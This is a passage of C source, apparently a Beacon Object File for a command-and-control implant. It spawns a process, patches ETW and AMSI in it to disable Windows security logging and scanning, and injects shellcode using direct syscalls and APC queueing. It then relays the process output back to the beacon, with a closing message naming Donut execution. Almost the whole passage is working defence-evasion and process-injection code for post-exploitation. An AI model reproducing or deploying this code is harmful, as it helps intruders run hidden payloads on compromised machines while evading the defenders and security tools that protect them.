        processSuccess = KERNEL32$CreateProcessA(NULL, program, NULL, NULL, bInheritHandles, creationFlags, NULL, NULL, si_ptr, &pi);
    }
    
    // Cleanup handles we don't need after CreateProcess
    if(!usePipeClient) {
        // Keep hWritePipe open (Always Async)
        KERNEL32$CloseHandle(hStdInRead);
        KERNEL32$CloseHandle(hStdInWrite);
    }

    if (attributeCount > 0 && si_ex.lpAttributeList) {
        pDeleteProcThreadAttributeList(si_ex.lpAttributeList);
        pLocalFree(si_ex.lpAttributeList);
    }
    
    if(!processSuccess) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hReadPipe);
        return;
    }

    // --- Patch ETW ---
    PatchETW(pi.hProcess);

    // --- Force Load AMSI & Patch ---
    ForceLoadAMSI(pi.hProcess);
    PatchAMSI(pi.hProcess);

    // --- Inject via Syscalls ---
    PVOID remoteAddr = NULL;
    SIZE_T regionSize = shellcode_len;
    
    NTSTATUS status = NtAllocateVirtualMemory(pi.hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (NT_SUCCESS(status)) {
        
        SIZE_T bytesWritten = 0;
        status = NtWriteVirtualMemory(pi.hProcess, remoteAddr, shellcode, shellcode_len, &bytesWritten);
        if (NT_SUCCESS(status)) {
            
            status = NtQueueApcThread(pi.hThread, remoteAddr, NULL, NULL, NULL);
            if (NT_SUCCESS(status)) {
                
                ULONG prevSuspend = 0;
                status = NtResumeThread(pi.hThread, &prevSuspend);
                if (!NT_SUCCESS(status)) {
                     BeaconPrintf(CALLBACK_ERROR, "NtResumeThread failed: 0x%08x", status);
                     KERNEL32$TerminateProcess(pi.hProcess, 0);
                     KERNEL32$CloseHandle(pi.hProcess);
                     KERNEL32$CloseHandle(pi.hThread);
                     KERNEL32$CloseHandle(hReadPipe);
                     return;
                }

                // Give the thread a moment to initialize and execute the APC
                pSleep(1000);

            } else {
                BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThread failed: 0x%08x", status);
                KERNEL32$TerminateProcess(pi.hProcess, 0);
                KERNEL32$CloseHandle(pi.hProcess);
                KERNEL32$CloseHandle(pi.hThread);
                KERNEL32$CloseHandle(hReadPipe);
                return;
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "NtWriteVirtualMemory failed: 0x%08x", status);
            KERNEL32$TerminateProcess(pi.hProcess, 0);
            KERNEL32$CloseHandle(pi.hProcess);
            KERNEL32$CloseHandle(pi.hThread);
            KERNEL32$CloseHandle(hReadPipe);
            return;
        }

    } else {
         BeaconPrintf(CALLBACK_ERROR, "NtAllocateVirtualMemory failed: 0x%08x", status);
         KERNEL32$TerminateProcess(pi.hProcess, 0);
         KERNEL32$CloseHandle(pi.hProcess);
         KERNEL32$CloseHandle(pi.hThread);
         KERNEL32$CloseHandle(hReadPipe);
         return;
    }

    // --- Synchronous pipe-read loop ---
    // The upstream async BOF framework (execute bof -a) runs this BOF in a
    // background thread. We read output synchronously here and use
    // BeaconWakeup() to signal the framework that output is available.

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process started (PID: %d)", pi.dwProcessId);
    BeaconWakeup();

    // Close write end so ReadFile will get EOF when child exits
    if (hWritePipe) {
        KERNEL32$CloseHandle(hWritePipe);
        hWritePipe = NULL;
    }

    KERNEL32$CloseHandle(pi.hThread);

    // Read pipe output until process exits or pipe closes
    WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
    WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
    WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char* readBuf = (char*)KERNEL32$HeapAlloc(hHeap, 0, 4096);
    DWORD bytesRead = 0;

    EXP_PeekNamedPipe pPeekNamedPipe = (EXP_PeekNamedPipe)KERNEL32$GetProcAddress(hKernel32, "PeekNamedPipe");
    HANDLE hStopEvent = BeaconGetStopJobEvent();

    if (readBuf) {
        if (pPeekNamedPipe) {
            while (1) {
                DWORD bytesAvail = 0;
                if (pPeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytesAvail, NULL)) {
                    if (bytesAvail > 0) {
                        BOOL readOk = KERNEL32$ReadFile(hReadPipe, readBuf, 4095, &bytesRead, NULL);
                        if (readOk && bytesRead > 0) {
                            readBuf[bytesRead] = '\0';
                            BeaconPrintf(CALLBACK_OUTPUT, "%s", readBuf);
                            BeaconWakeup();
                            continue;
                        } else {
                            break;
                        }
                    }
                } else {
                    break;
                }

                if (hStopEvent != NULL && KERNEL32$WaitForSingleObject(hStopEvent, 0) == 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[!] Job killed. Terminating process %d.", pi.dwProcessId);
                    BeaconWakeup();
                    KERNEL32$TerminateProcess(pi.hProcess, 0);
                    break;
                }

                if (KERNEL32$WaitForSingleObject(pi.hProcess, 50) == 0) {
                    while (pPeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
                        BOOL readOk = KERNEL32$ReadFile(hReadPipe, readBuf, 4095, &bytesRead, NULL);
                        if (readOk && bytesRead > 0) {
                            readBuf[bytesRead] = '\0';
                            BeaconPrintf(CALLBACK_OUTPUT, "%s", readBuf);
                            BeaconWakeup();
                        } else {
                            break;
                        }
                    }
                    break;
                }
            }
        } else {
            while (1) {
                BOOL readOk = KERNEL32$ReadFile(hReadPipe, readBuf, 4095, &bytesRead, NULL);
                if (!readOk || bytesRead == 0) {
                    break;
                }
                readBuf[bytesRead] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "%s", readBuf);
                BeaconWakeup();
            }
            KERNEL32$WaitForSingleObject(pi.hProcess, 30000);
        }
        KERNEL32$HeapFree(hHeap, 0, readBuf);
    }

    KERNEL32$CloseHandle(hReadPipe);
    KERNEL32$CloseHandle(pi.hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Donut execution finished (PID: %d)", pi.dwProcessId);
    BeaconWakeup();
}
